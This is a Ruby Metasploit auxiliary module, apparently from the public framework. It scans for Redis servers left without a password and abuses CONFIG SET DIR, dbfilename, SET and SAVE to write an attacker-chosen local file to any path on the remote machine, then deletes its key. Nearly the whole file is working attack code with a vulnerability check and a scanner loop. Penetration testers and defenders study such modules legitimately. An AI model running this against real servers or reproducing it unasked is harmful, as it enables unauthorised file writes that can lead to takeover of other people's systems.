##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Redis Unauthenticated File Upload',
        'Description'   => %q(
          This module can save data to file in remote redis server,
          Because redis is unprotected without a password set up.
        ),
        'License'       => MSF_LICENSE,
        'Author'        => ['Nixawk'],
        'References'    => [
          ['URL', 'http://antirez.com/news/96'],
          ['URL', 'http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/'],
          ['URL', 'http://redis.io/topics/protocol']
        ],
        'Platform'      => %w(unix linux),
        'Targets'       => [['Automatic Target', {}]],
        'Privileged'    => true,
        'DefaultTarget' => 0,
        'DisclosureDate' => 'Nov 11 2015'
      )
    )
    register_options(
      [
        Opt::RPORT(6379),
        OptPath.new('LocalFile', [true, 'Local file to be uploaded']),
        OptString.new('RemoteFile', [true, 'Remote file path'])
      ]
    )

    register_advanced_options(
      [
        OptInt.new('READ_TIMEOUT', [true, 'Seconds to wait while reading redis responses', 2])
      ]
    )
  end

  def read_timeout
    datastore['READ_TIMEOUT']
  end

  def redis_proto(parts)
    return if parts.blank?
    command = "*#{parts.length}\r\n"
    parts.each do |p|
      command << "$#{p.length}\r\n#{p}\r\n"
    end
    command
  end

  def send_command(command)
    command = redis_proto(command)
    sock.put(command)
    sock.get_once(-1, read_timeout)
  end

  def send_file(path, content)
    dirname = File.dirname(path)
    basename = File.basename(path)

    key = Rex::Text.rand_text_alpha(32)
    command = ['CONFIG', 'SET', 'DIR', "#{dirname}"]
    data = send_command(command)
    vprint_status("REDIS Command: #{command.join(' ')} - #{data.chop}")
    return unless data.include?('+OK')

    command = ['CONFIG', 'SET', 'dbfilename', "#{basename}"]
    data = send_command(command)
    vprint_status("REDIS Command: #{command.join(' ')} - #{data.chop}")
    return unless data.include?('+OK')

    command = ['SET', "#{key}", "#{content}"]
    data = send_command(command)

    vprint_status("REDIS Command: #{command.join(' ')} - #{data.chop}")
    return unless data.include?('+OK')
    print_good("#{rhost}:#{rport}: save file to #{path}")

    command = ['SAVE']
    data = send_command(command)
    vprint_status("REDIS Command: #{command.join(' ')} - #{data.chop}")
    return unless data.include?('+OK')

    command = ['DEL', "#{key}"]
    data = send_command(command)
    vprint_status("REDIS Command: #{command.join(' ')} - #{data.chop}")
    return unless data.include?('+OK')
  end

  def check
    connect
    data = send_command(['INFO'])
    disconnect
    if data && data.include?('redis_mode')
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  def peer
    "#{rhost}:#{rport}"
  end

  def setup
    @upload_content = "\n\n#{IO.read(datastore['LocalFile'])}\n\n\n"
  end

  def run_host(ip)
    connect
    unless (res = send_command(['PING']))
      vprint_error("#{peer} -- did not respond to our redis PING")
      return
    end

    if res =~ /PONG/
      vprint_good("#{peer} -- responded positively to our PONG")
      send_file(datastore['RemoteFile'], @upload_content)
    else
      vprint_good("#{peer} -- responded unknown to our PONG: #{res}")
    end
  ensure
    disconnect
  end
end
